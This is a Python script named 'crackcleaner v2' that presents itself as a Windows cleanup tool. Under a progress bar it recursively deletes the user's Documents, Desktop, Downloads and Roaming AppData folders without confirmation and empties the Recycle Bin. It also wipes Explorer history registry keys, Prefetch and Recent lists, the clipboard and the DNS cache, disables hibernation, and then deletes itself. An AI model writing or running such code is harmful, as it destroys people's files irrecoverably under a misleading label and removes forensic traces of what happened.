import os, shutil, tempfile, ctypes, sys, subprocess, threading, time, winreg
from pathlib import Path
from queue import Queue

G = "\033[92m"
Z = "\033[0m"

print(G + "crackcleaner v2\n" + Z)

def progress(current, total, task=""):
    bar_len = 40
    filled = int(bar_len * current / total)
    bar = "#" * filled + "-" * (bar_len - filled)
    pct = int(current / total * 100)
    print(f"\r{G}[{bar}] {pct:>3}% {task:<40}{Z}", end="")

def safe_wipe(path, exclude=[]):
    items = []
    for r, dirs, files in os.walk(path):
        for f in files:
            full = os.path.join(r, f)
            if not any(ex in full for ex in exclude):
                items.append(full)
        for d in dirs:
            full = os.path.join(r, d)
            if not any(ex in full for ex in exclude):
                items.append(full)
    return items

def delete_item(item):
    try:
        if os.path.isdir(item):
            shutil.rmtree(item, ignore_errors=True)
        else:
            os.remove(item)
    except: pass

def worker(q, counter, total):
    while not q.empty():
        item = q.get()
        delete_item(item)
        counter[0] += 1
        progress(counter[0], total, "Flushing Files")
        q.task_done()

def nuke_registry(keys):
    for k in keys:
        try: winreg.DeleteKey(winreg.HKEY_CURRENT_USER, k)
        except: pass

def empty_trash(): 
    try: ctypes.windll.shell32.SHEmptyRecycleBinW(None, None, 0x0007)
    except: pass

def clear_clipboard():
    try:
        ctypes.windll.user32.OpenClipboard(0)
        ctypes.windll.user32.EmptyClipboard()
        ctypes.windll.user32.CloseClipboard()
    except: pass

def flush_dns():
    try:
        subprocess.run("ipconfig /flushdns", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except: pass

def wipe_hiberfiles():
    try:
        subprocess.run('powercfg /h off', shell=True)
        subprocess.run('wmic pagefile where name="C:\\\\pagefile.sys" set ClearAtShutdown=True', shell=True)
    except: pass

def wipe_browser_cache():
    user = os.getlogin()
    paths = [
        f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache",
        f"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache",
        f"C:\\Users\\{user}\\AppData\\Local\\Mozilla\\Firefox\\Profiles"
    ]
    safe_apps = ["Discord", "Steam", "EpicGamesLauncher"]
    for path in paths:
        if os.path.exists(path):
            if "Firefox" in path:
                for profile in os.listdir(path):
                    cache = os.path.join(path, profile, "cache2")
                    folder_items = safe_wipe(cache, exclude=safe_apps)
                    for f in folder_items: delete_item(f)
            else:
                folder_items = safe_wipe(path, exclude=safe_apps)
                for f in folder_items: delete_item(f)

def self_delete():
    try:
        f = Path(sys.argv[0]).resolve()
        subprocess.Popen(f'cmd /c ping 127.0.0.1 -n 3 > NUL && del "{f}"', shell=True)
    except: pass

def clean():
    user = os.getlogin()
    folders = [
        tempfile.gettempdir(),
        f"C:\\Users\\{user}\\AppData\\Local\\Temp",
        f"C:\\Users\\{user}\\AppData\\Roaming",
        f"C:\\Users\\{user}\\Downloads",
        f"C:\\Users\\{user}\\Documents",
        f"C:\\Users\\{user}\\Desktop",
        r"C:\Windows\Temp",
        r"C:\Windows\Prefetch",
        os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Recent"),
        os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Recent\AutomaticDestinations")
    ]

    safe_apps = ["Discord", "Steam", "EpicGamesLauncher", "Chrome", "Firefox", "Edge"]

    q = Queue()
    total_items = 0
    for path in folders:
        if os.path.exists(path):
            folder_items = safe_wipe(path, exclude=safe_apps)
            total_items += len(folder_items)
            for item in folder_items:
                q.put(item)
    if total_items == 0: total_items = 1

    counter = [0]
    threads = []
    for _ in range(8):
        t = threading.Thread(target=worker, args=(q, counter, total_items))
        t.start()
        threads.append(t)
    for t in threads: t.join()

    nuke_registry([
        r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
        r"Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU",
        r"Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSaveMRU"
    ])

    clear_clipboard()
    flush_dns()
    empty_trash()
    wipe_hiberfiles()
    wipe_browser_cache()

t = threading.Thread(target=clean)
t.start()
t.join()

self_delete()
